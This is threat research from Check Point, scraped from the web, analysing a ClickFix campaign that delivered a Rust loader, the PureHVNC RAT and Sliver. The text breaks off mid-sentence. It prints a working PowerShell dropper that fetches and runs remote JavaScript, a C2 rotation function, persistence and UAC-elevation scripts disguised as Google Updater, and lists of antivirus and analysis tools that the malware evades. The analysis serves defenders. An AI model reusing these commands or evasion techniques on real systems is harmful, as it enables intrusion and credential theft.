Egypt Germany Iran Turkey Democratic Republic of the Congo Thailand France United Kingdom Italy Burma South Africa South Korea Colombia Spain Ukraine Tanzania Kenya Argentina Algeria Poland Sudan Uganda Canada Iraq Morocco Peru Uzbekistan Saudi Arabia Malaysia Venezuela Nepal Afghanistan Yemen North Korea Ghana Mozambique Taiwan Australia Ivory Coast Syria Madagascar Angola Cameroon Sri Lanka Romania Burkina Faso Niger Kazakhstan Netherlands Chile Malawi Ecuador Guatemala Mali Cambodia Senegal Zambia Zimbabwe Chad South Sudan Belgium Cuba Tunisia Guinea Greece Portugal Rwanda Czech Republic Somalia Haiti Benin Burundi Bolivia Hungary Sweden Belarus Dominican Republic Azerbaijan Honduras Austria United Arab Emirates Israel Switzerland Tajikistan Bulgaria Hong Kong (China) Serbia Papua New Guinea Paraguay Laos Jordan El Salvador Eritrea Libya Togo Sierra Leone Nicaragua Kyrgyzstan Denmark Finland Slovakia Singapore Turkmenistan Norway Lebanon Costa Rica Central African Republic Ireland Georgia New Zealand Republic of the Congo Palestine Liberia Croatia Oman Bosnia and Herzegovina Puerto Rico Kuwait Moldov Mauritania Panama Uruguay Armenia Lithuania Albania Mongolia Jamaica Namibia Lesotho Qatar Macedonia Slovenia Botswana Latvia Gambia Kosovo Guinea-Bissau Gabon Equatorial Guinea Trinidad and Tobago Estonia Mauritius Swaziland Bahrain Timor-Leste Djibouti Cyprus Fiji Reunion (France) Guyana Comoros Bhutan Montenegro Macau (China) Solomon Islands Western Sahara Luxembourg Suriname Cape Verde Malta Guadeloupe (France) Martinique (France) Brunei Bahamas Iceland Maldives Belize Barbados French Polynesia (France) Vanuatu New Caledonia (France) French Guiana (France) Mayotte (France) Samoa Sao Tom and Principe Saint Lucia Guam (USA) Curacao (Netherlands) Saint Vincent and the Grenadines Kiribati United States Virgin Islands (USA) Grenada Tonga Aruba (Netherlands) Federated States of Micronesia Jersey (UK) Seychelles Antigua and Barbuda Isle of Man (UK) Andorra Dominica Bermuda (UK) Guernsey (UK) Greenland (Denmark) Marshall Islands American Samoa (USA) Cayman Islands (UK) Saint Kitts and Nevis Northern Mariana Islands (USA) Faroe Islands (Denmark) Sint Maarten (Netherlands) Saint Martin (France) Liechtenstein Monaco San Marino Turks and Caicos Islands (UK) Gibraltar (UK) British Virgin Islands (UK) Aland Islands (Finland) Caribbean Netherlands (Netherlands) Palau Cook Islands (NZ) Anguilla (UK) Wallis and Futuna (France) Tuvalu Nauru Saint Barthelemy (France) Saint Pierre and Miquelon (France) Montserrat (UK) Saint Helena, Ascension and Tristan da Cunha (UK) Svalbard and Jan Mayen (Norway) Falkland Islands (UK) Norfolk Island (Australia) Christmas Island (Australia) Niue (NZ) Tokelau (NZ) Vatican City Cocos (Keeling) Islands (Australia) Pitcairn Islands (UK) Email We value your privacy! BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies. ACCEPT REJECT",
    "filtered_content": "CONTACT US DISCLOSURE POLICY CHECKPOINT.COM UNDER ATTACK? Latest Publications CPR Podcast Channel Web 3.0 Security Intelligence Reports Resources ThreatCloud AI Threat Intelligence & Research Zero Day Protection Sandblast File Analysis About Us SUBSCRIBE SUBSCRIBE CATEGORIES Android Malware 23 Artificial Intelligence 4 ChatGPT 3 Check Point Research Publications 442 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 1 Data Analysis 0 Demos 22 Global Cyber Attack Reports 394 How To Guides 13 Ransomware 3 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 173 Web 3.0 Security 11 Wipers 0 Under the Pure Curtain: From RAT to Builder to Coder September 16, 2025 https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/ Research by: Antonis Terefos ( @Tera0017 ) Key Points Check Point Research conducted a forensic analysis of a ClickFix campaign that lured victims with fake job offers that resulted in an eight-day intrusion. The threat actor deployed multiple tools, including a Rust Loader , PureHVNC RAT , and the Sliver command-and-control framework. In this publication, we analyzed the associated files, providing one of the most comprehensive analyses of PureHVNC RAT , including its complete set of commands and plugins. During communication with the command and control server, the bot received three GitHub URLs containing supporting files for specific PureHVNC functionalities. Analysis confirmed that both the URLs and the associated GitHub accounts were directly linked to the developer of the Pure malware family. Where previously little to no information was known about PureCoder , this publication sheds light on the developer\u2019s timezone of operation (UTC+0300) and potential countries of residence. This lead may enable further intelligence gathering by relevant agencies. Further investigation led to the discovery of a PureRAT builder , revealing insights into the RAT\u2019s capabilities and highlighting features linked to PureCrypter , another tool developed by PureCoder , the author behind the Pure malware suite. Introduction The Pure malware family is a suite of malicious tools developed and sold by the author known as PureCoder . This suite includes PureHVNC RAT (a remote administration tool and predecessor to PureRAT ), PureCrypter (a malware obfuscator), PureLogs (a stealer/logger), and several other tools. The malicious software is advertised and distributed through underground forums, Telegram channels, and dedicated websites. These products are often combined to maximize their effectiveness across a wide range of malicious operations. While PureCoder is responsible for building and maintaining the malware ecosystem, cybercriminal customers primarily use these tools to conduct campaigns. In 2025, there has been a noticeable increase in the use of Pure malware products, with threat actors distributing them through various methods, including malspam, phishing websites, and the ClickFix technique. During a Check Point Incident Response (IR) engagement, our team investigated and contained an eight-day intrusion. The threat actor distributed a Rust loader, which deployed PureHVNC RAT with campaign IDs 2a and amazon3 . The attacker lured the victim through fake job advertisements, allowing the attacker to execute malicious PowerShell code through the ClickFix phishing technique. The RAT\u2019s Command and Control Server (C&C) has been observed to deliver three GitHub URLs to infected victims and download the related files. These downloaded files support various commands used by PureHVNC RAT and were determined to be part of the Pure development and operation infrastructure rather than the threat actor itself. As a result, the GitHub accounts involved were attributed to the developer of Pure malware families, PureCoder . While limited information is currently available about the author of these products, analysis of the associated GitHub accounts revealed a timezone of operation set to UTC+0300 , which corresponds to several countries, including Russia. ClickFix Campaign & Forensics Artifacts ClickFix is a social engineering phishing technique in which victims are presented with deceptive instructions designed to trick them into running a malicious command. In this campaign, the victim was lured to the ClickFix phishing page through fake job offers. Upon visiting the page, a PowerShell command was automatically copied to their clipboard, delivering a malicious JavaScript file. During the eight-day intrusion, the attacker used malicious JavaScript files , deployed two instances of PureHVNC RAT , established persistence on the victim\u2019s system, and finally executed the Sliver Command and Control (C2) framework. Figure 1 \u2014 Infection Chain. Infection Day 1 \u2013 ClickFix & PureHVNC During the first moments of the initial access, we observe the majority of interaction from the threat actor dropping JavaScript files and the first version of PureHVNC RAT. The victim was lured through fake job offers, and upon visiting the malicious ClickFix website, a PowerShell command was automatically copied to their clipboard. Figure 2 \u2014 ClickFix prompt. The page instructed the user to paste and execute the command. If executed, the command downloaded and ran a malicious JavaScript file , initiating the infection chain. Copied PowerShell command: powershell -c \"$j=$env:TEMP+'\\a.js';sc $j 'a=new ActiveXObject(\\\"MSXML2.XMLHTTP\\\");a.open(\\\"GET\\\",\\\"63381ba/kcilc.ellrafdlucolc//:sptth\\\".split(\\\"\\\").reverse().join(\\\"\\\"),0);a.send();eval(a.responseText);';wscript $j\" Pr\u0435ss Ent\u0435r The command and control server responded with malicious JavaScript code, which created a malicious LNK file in the Startup Folder and granted itself persistence to the machine. The malicious JavaScript file is obfuscated, and each day, it contacts a different command and control server and waits for further instructions. function getURL() { var C2_domain_list = ['stathub[.]quest', 'stategiq[.]quest', 'mktblend[.]monster', 'dsgnfwd[.]xyz', 'dndhub[.]xyz']; var current_datetime = new Date().getTime(); var no_days = getDaysDiff(0, current_datetime); return 'https://' + getListElement(C2_domain_list, no_days) + '/Y/?t=' + current_datetime + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime); } The JavaScript delivers the first version of PureHVNC RAT with command and control 54[.]197.141.245 and campaign ID 2a . Infection Day 2 \u2013 Rust Loader & PureHVNC During the second day of the infection, the threat actor deployed a newer version of PureHVNC RAT packed with a Rust Loader and Inno Setup, an open-source installation builder for Windows applications. This Rust Loader that deploys PureHVNC RAT is dropped in %APPDATA%\\Microsoft\\SystemCertificates\\9TwinAPIInterop.pfx and contains no differences with the first version, the only change appears to be the campaign ID amazon3 . PureHVNC RAT Configuration: { \"C&C\": \"54.197.141.245\", \"ports\": [443, 10443], \"certificate\": \"MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2\", \"campaign_id\": \"amazon3\", \"install_path\": \"APPDATA\", \"mutex\": \"aa05be285061\" } Infection Day 8 \u2013 Sliver Implant After mostly staying inactive for more than six days, possibly to verify that the infected machine is a real target rather than a sandbox environment, the threat actor delivered a Sliver implant with C&C hxxps://jq-scripts.global.ssl[.]fastly[.]net . Sliver then delivered and executed a PowerShell Script that requested the user\u2019s password in a prompt and stored the credentials at %ProgramData%/<domain>_<username>_cred.txt . Figure 3 \u2014 PowerShell User-Credential Theft Script. Rust Loader \u2013 Technical Analysis The malicious loader is a DLL file developed in Rust programming language and is executed using LOLBin regsvr32. The malicious functionality lies in the function exports DllRegisterServer and DllUnregisterServer , which contains the same piece of code. String Decryption The malware contains encrypted strings that are decrypted on demand using the ChaCha20-Poly1305 algorithm. The decryption key is generated by the XOR of two hardcoded values embedded in the binary: Value 1: 4a01d45563d802fee5593a21f1b216aeed83c4dff50fa6a31391ff73feb29dbd Value 2: bf83184822bf184536b50dff4758edd638b59cb82a06ee019b62b0bce33d07b5 Chacha20-Poly1305 Key: f582cc1d41671abbd3ec37deb6eafb78d5365867df0948a288f34fcf1d8f9a08 Anti-analysis Techniques The first anti-analysis techniques monitor the running processes and try to identify various processes related to antivirus and security software, debuggers, reverse engineering tools and monitoring tools. The malware detected antivirus processes from Bitdefender, ESET, Kaspersky, Ad-Aware, and 360 Total Security. Blacklisted processes: \"bdservicehost.exe\", \"bdredline.exe\", \"aylaunch.exe\", \"egui.exe\", \"360Safe.exe\", \"zhudongfangyu.exe\", \"HipsDaemon.exe\", \"ekrn.exe\", \"eguiProxy.exe\", \"avp32.exe\", \"avpcc.exe\", \"avpm.exe\", \"avpdos32.exe\", \"avp.exe\", \"adawareservice.exe\", \"ksdumper.exe\", \"decoder.exe\", \"dnspy.exe\", \"dbgx.shell.exe\", \"ilspy.exe\", \"ollydbg.exe\", \"x32dbg.exe\", \"x64dbg.exe\", \"gdb.exe\", \"idaq.exe\", \"idag.exe\", \"idaw.exe\", \"ida64.exe\", \"idag64.exe\", \"idaw64.exe\", \"idaq64.exe\", \"windbg.exe\", \"immunitydebugger.exe\", \"windasm.exe\", \"scylla.exe\", \"scyllahide.exe\", \"cheatengine.exe\", \"pe-bear.exe\", \"ollyice.exe\", \"radare2.exe\", \"ghidra.exe\", \"sysanalyzer.exe\", \"xperf.exe\", \"procdump.exe\", \"dbgview.exe\", \"apimonitor.exe\", \"pe-sieve64.exe\", \"pe-sieve32.exe\", \"pe-moneta.exe\" The second anti-analysis technique includes a list of API functions specifically present in Microsoft\u2019s Windows Defender Malware Analysis Emulator. This technique addresses the differences between the Windows libraries and the virtual ones, which contain more API calls specifically related to the emulated environment. Blacklisted APIs: \"MpVmp32Entry\", \"NtControlChannel\", \"ObjMgr_ValidateVFSHandle\", \"ThrdMgr_GetCurrentThreadHandle\", \"ThrdMgr_SaveTEB\", \"ThrdMgr_SwitchThreads\", \"VFS_CopyFile\", \"VFS_DeleteFile\", \"VFS_DeleteFileByHandle\", \"VFS_FileExists\", \"VFS_FindClose\", \"VFS_FindFirstFile\", \"VFS_FindNextFile\", \"VFS_FlushViewOfFile\", \"VFS_GetAttrib\", \"VFS_GetHandle\", \"VFS_GetLength\", \"VFS_MapViewOfFile\", \"VFS_MoveFile\", \"VFS_Open\", \"VFS_Read\", \"VFS_SetAttrib\", \"VFS_SetCurrentDir\", \"VFS_SetLength\", \"VFS_UnmapViewOfFile\", \"VFS_Write\", \"MpAddToScanQueue\", \"MpCreateMemoryAliasing\", \"MpCallPostEntryPointCode\", \"MpCallPreEntryPointCode\", \"MpDispatchException\", \"MpExitThread\", \"MpFinalize\", \"MpGetCurrentThreadHandle\", \"MpGetCurrentThreadId\", \"MpGetLastSwitchResult\", \"MpGetPseudoThreadHandle\", \"MpGetSelectorBase\", \"MpGetVStoreFileHandle\", \"MpHandlerCodePost\", \"MpIntHandler\", \"MpIntHandlerParam\", \"MpIntHandlerReturnAddress\", \"MpNtdllDatatSection\", \"MpReportEvent\", \"MpReportEventEx\", \"MpReportEventW\", \"MpSehHandler\", \"MpSetSelectorBase\", \"MpStartProcess\", \"MpSwitchToNextThread\", \"MpSwitchToNextThread_WithCheck\", \"MpSwitchToNextThread_NewObjManager\", \"MpTimerEvent\", \"MpTimerEventData\", \"MpUfsMetadataOp\", \"MpValidateVFSHandle\", \"MpVmp32FastEnter\" If any of those anti-analysis techniques detects that the malware is being analyzed and monitored under an emulated or sandbox environment, it will sleep for a random time between 10 to 30 minutes, by executing the command cmd /c timeout /t {random_time} >null , once awake, if still running in the monitored environment, it reruns the anti-analysis process, and if it is again detected, it falls into a random sleep again. The Rust Loader requires that it be executed with a specific command line parameter that, if it is not present, terminates its execution. The malware retrieves the parameters passed to the process and tries to find the parameter /i:--type=renderer . As a final anti-analysis and evasion technique, immediately following the successful decryption of its payload, the malware actively implements an AMSI bypass by injecting a hook into the native LdrLoadDll function within ntdll.dll . This hook intercepts attempts to load the amsi.dll library\u2014responsible for the Windows Anti-malware Scan Interface\u2014and effectively prevents it from being loaded into the process. By doing so, the malware disables AMSI\u2019s runtime scanning capabilities, thereby evading detection and analysis by security products that rely on AMSI for real-time malware inspection. Figure 4 \u2014 LdrLoadDll Hooked function. Persistence The malware checks if the process is not running with administrative privileges, then executes the PowerShell command below to grant the malware higher privileges. \"powershell\" -Command \" while ($true) { try { Start-Process -FilePath 'cmd.exe' ` -Verb runas ` -ArgumentList '/c start \"\" /B \"regsvr32.exe\" {MALWARE} /i:--type=renderer'; exit } catch {} } \" This PowerShell will try to execute the malicious DLL with administrative privileges in an infinite loop until the User accepts the UAC (User Account Control) prompt. Once the prompt is accepted, the process terminates itself, and the infection continues with the one that obtained higher privileges. The loader, to avoid being executed twice, creates a Mutex MistyRoseNavy and then executes a PowerShell command, which will maintain persistence to the system via scheduled tasks. The first PowerShell command will try to see if any Scheduled Task is already registered in the system. \"powershell\" -Command \" if ( Get-ScheduledTask | Where-Object { $_.Actions.Execute -eq 'regsvr32' -and $_.Actions.Arguments -eq '/s /i:--type=renderer \\\"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\\\"' } ) { exit 0 } else { exit 1 } \" If not, it will proceed to create persistence on the infected machine. The Task name and path were made to mimic a Google Updater: Register-ScheduledTask ` -Action ( New-ScheduledTaskAction ` -Execute \"regsvr32\" ` -Argument \"/s /i:--type=renderer \"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\"\" ) ` -Trigger ( New-ScheduledTaskTrigger ` -Once -At (Get-Date).AddMinutes(1) ` -RepetitionInterval (New-TimeSpan -Minutes 1) ) ` -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}' ` -TaskPath '\\GoogleSystem\\GoogleUpdater' ` -Description 'GoogleUpdater Task System 196.6.2928.90' ` -Settings ( New-ScheduledTaskSettingsSet ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ` -ExecutionTimeLimit 0 ` -DontStopOnIdleEnd ) ` -RunLevel Highest The execution of the above script will be performed by running it as a PowerShell over stdin , executing first the below command and writing into a Pipe WriteFileEx the persistence PowerShell script. PowerShell.exe -NoProfile -NonInteractive -Command - Payload Decryption & Execution The payload is embedded inside the Rust binary and is decrypted using a simple XOR with a 32-byte key. Figure 5 \u2014 Payload decryption routine. Later, the malware will validate the decrypted value, which will determine the next step. The validation occurs by XORing the decrypted bytes and generating a hash value. Figure 6 \u2014 Hash generation. This hash value is further processed and compared with the value 0x6. During this function, we also observe the hexadecimal value 0xDEADBEEF even though it does not affect the output, which appears to be used solely as a marker. Figure 7 \u2014 Hash validation. The next step, the malware checks if the decrypted payload is bigger than 1 KB (1024 Bytes), and only if so, proceeds further with the infection, otherwise, it terminates itself. At this stage, the malware has already hooked LdrLoadDll successfully bypasses AMSI loading. Figure 8 \u2014 Size check. As the last step, the Rust Loader creates a heap, copies the decrypted payload buffer into it, and executes the shellcode. Figure 9 \u2014 Shellcode NOP and CALL instruction. The buffer contains a .NET payload, which is executed via the shellcode. Once the .NET crypter decrypts the final payload using AES and decompresses it using Gzip , it is identified as PureHVNC . Figure 10 \u2014 Deobfuscated .NET Assembly Explorer. PureHVNC RAT \u2013 Technical Analysis PureHVNC is a product of the Pure family of malicious software developed by PureCoder . The malware provides HVNC capabilities (Hidden Virtual Network Computing), which allows an attacker to control an infected machine without the session being visible to the infected user. The analyzed malware contains obfuscated strings and function calls that are dynamically decrypted. By using NETReactorSlayer , we can obtain a cleaner version of this malware. Configuration The malware configuration is protobuf s erialized , Gzip compressed, and Base64 encoded. The reverse process retrieves the malware configuration, which contains execution configurations such as the command and control server, port number and mutex name. Figure 11 \u2014 Malware Configuration. The deserialization of the decompressed buffer can be done using the protod tool, which gives the following output. C:\\> protod --hex b202c30d0a0e35342e3139372e3134312e32343510bb0310cb511a880d4d494945346a434341737167417749424167495141504b4f6c6c78707a57456637436967326977515554414e42676b71686b69473977304241513046414441534d52417744675944565151444441645864325a7761485a694d434158445449304d446b784e5445794e4455774e316f59447a6b354f546b784d6a4d784d6a4d314f545535576a41534d52417744675944565151444441645864325a7761485a694d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454133516d2b4f345a58386537716e7a62374163532b4d4b754d6d4e616e3036486746317456337a43393274694c2f51796c43793354665a3147516d75742b634f66755a627939755941794d463734757874777046707236707a4c34707333487870757842727641635273554b56536870517a474f544d776c4a574a6a376e445831546e2f5049723967353543376a54462f6b3933677264474e333845415951536437356778685a37736464435a4675427936426474323155526b6e69704e394e33792f646c444f2b71425a6d625668474745715a31487256443252706d4b4b454f364f5a7534584a484c726e3145736a6778794d306966623750333862522f6344423250787a4f7147525a2f536e68673542772f754738322b7477596b70364378565248353979616d6c487039715246347652464c6b3038785a302b6c526b51563442724557624136306f6d4970335844646e4d4f50465a6e7148554d5442545a3837314c4537383256463334784d3551644941327236516a714e794b53796d622f6c4d634c4a45686c4a2b44456630355932306c45396e4a546e2f696f4d4b4f2f696c737a4a4f6875384e533433672b746f725043454f76446c644266787467637034772b5358584c665569332b702f3332364a5867685270715a555139395661482f756354347250394363536a49716c43796d507541684f5a6d5244794d416357757a737a2f315354675a3866785030445670726470544c764e396e2b65734d505948524543556c615a4c646e397839416d5a4152624d61744f64417a48384c675154473032656356532f70457567555667374970786e367057716a4b2b4e53464e72316b784359493555715a4b35304364494e6f4b4d382b6672413767416c336f686e593462524b366246696f61434363435a4a463746614a4a682b4544732f4351364b634c706e6b434177454141614d794d444177485159445652304f424259454642396a546c4e6561355a734a6437436c44682f6365706b46585a5a4d41384741315564457745422f7751464d414d42416638774451594a4b6f5a496876634e4151454e42514144676749424148336e466e7675504575664d334277504e6668677335526b5050586b3270473963547a6e784552336833376b52336a6775456e7132774c3779594132443330584138744a76372b43505a2f4972745343304f5379456d77386135466f48746e6f32326535447471383146593463386b465453307033396d744145746974414765684d7945364b3358304c67764e6178577762644c3972636b6f36326d7378714b527733667861466a544e4b2b746c35483654386a584835564d714564306569694b357953616e4c6b69792b4366594a6e7971426f49435957347231572f6f3635696267787a506f4f7a63626f64345547394f36597744714d444e384a6c514451546c37675a4c697443526361425a51796e494e4632795a775a5969726457714b3058336668514c6c756f5a397a58686335726233554d352b51765039702f5a61554f495a306d3138766a56636e7a365a6f394e36304b393375355a2f497a42636438674d315770336474447275656b626a64587338622b74784d4446537935365a5042464c4a68574f34787047743137325a4d7036447539734d4157446144546650765a5770724535576a436b34666c744d515530444762506d5031696c33584c7471567650694c767541636372624c39776b766c76444b676a715570596a587364464f5435756e586959633165454457344849574e4a634977324a346f7a384932416c77512b657856544541725163384733664e624d73765a4437437453564a4b715a4c536b41666f6b69335a72732f6649465447474e7a512f56626230314b376b3773326d4151344d72314a6a4e682f5a776c546475624b5a702b6a6241527268447676645049537570536f304b444b426a776b5932746347772f615473594b644e7977446e38567149764c6a4868444b4734764d6d3746596f4c4d64455749584e797650316f4a322207616d617a6f6e333a004207415050444154414a0c616130356265323835303631 [b2 02] 38 string: (1731) [0a] 1 string: (14) 54.197.141[.]245 [10] 2 varint: 443 (0x1bb) [10] 2 varint: 10443 (0x28cb) [1a] 3 string: (1672) MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2 [22] 4 string: (7) amazon3 (61 6d 61 7a 6f 6e 33) [3a] 7 string: (0) [42] 8 string: (7) APPDATA (41 50 50 44 41 54 41) [4a] 9 string: (12) aa05be285061 The above configuration stores values in a specific class whose properties are decorated with [ProtoMember(n)] attributes, indicating that it uses Protocol Buffers ( protobuf-net ) for serialization. ProtoMember Description 1 Malware Command and Control Server. 2 C&C port. 3 TLS certificate, used for C&C communication. 4 Campaign ID. 5 Maintain Persistence flag. 6 Flag value, which executes SetThreadExecutionState Windows API that prevents the system from sleeping or turning off the display. 7 Task name, used for maintaining persistence via Scheduled Task. If the field is not defined the executable name is used. 8 Environment variable which will be used to retrieve the installation folder. This file path will be used for persistence. 9 Mutex name, assuring the malware process is unique. 10 Unknown, unused field. Persistence PureHVNC , similar to the Rust Loader described above, maintains its persistence in the system\u2019s Scheduled Task by executing a PowerShell command. When running with admin rights, the malware will execute the following script: Register-ScheduledTask ` -TaskName '<task_name>' ` -Action ( New-ScheduledTaskAction -Execute '<executable_path>' ) ` -Trigger ( New-ScheduledTaskTrigger -Once -At (Get-Date) ` -RepetitionInterval (New-TimeSpan -Minutes 5) ) ` -User $env:UserName ` -**RunLevel Highest** ` -Settings ( New-ScheduledTaskSettingsSet ` -ExecutionTimeLimit (New-TimeSpan -Seconds 0) ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ) ` -Force When the process runs as a normal user, the command will run without the -RunLevel Highest option. Depending on the process rights, the appropriate command will be Base64 encoded and then executed using the -Enc PowerShell parameter. Figure 12 \u2014 Encodes command with Base64 and executes PowerShell. Network Communication The malware initially tries to check if the endpoint is currently alive, first trying to Connect via socket and then sends four bytes to the C&C 04 00 00 00 . Figure 13 \u2014 Initial communication. The malware creates an SSLStream and performs an SSL handshake, verifying the server\u2019s certificate against a certificate embedded in its configuration. During this stage, PureHVNC collects Bot information that will be sent to the attacker\u2019s server. This information will be serialized and then compressed using Gzip . If the compressed data exceeds approximately 1 MB (1,000,000 bytes), it will be sent in 16 KB chunks. Figure 14 \u2014 Compressed data into chunks. Once data is sent, PureHVNC receives the compressed buffer size from the C&C via an SSL stream and reads the entire buffer into an array. After decompressing and deserializing the data, the malware executes the received command in a separate thread. Figure 15 \u2014 Command execution in a separate Thread. Collected Data PureHVNC collects and sends data from the infected system to the C&C server. This includes installed antivirus products, bot identifier, user domain and privileges, OS version, executable filename, idle time, and installed applications of interest. The information also contains metadata such as the malware version ( 4.1.9 ) and campaign ID ( amazon3 ) obtained from the malware configuration. Figure 16 \u2014 Data sent to C&C. To retrieve the Antivirus products queries Windows Management Instrumentation (WMI) for installed antivirus products on the system, \"SELECT * FROM AntiVirusProduct\u201d . In addition to collecting information about installed antivirus products, the malware also checks for the presence of specific applications of interest on the host system. It scans predefined directories, files, and registry keys associated with known crypto wallet software, browser extensions, and messaging or email clients to find them (see Appendix ). Among the data sent to the C&C, there are three pieces of information that can also serve as anti-sandbox indicators, helping the attacker determine whether the bot resides on a real user system or within a sandboxed or virtualized analysis environment. The first technique returns a Boolean value indicating 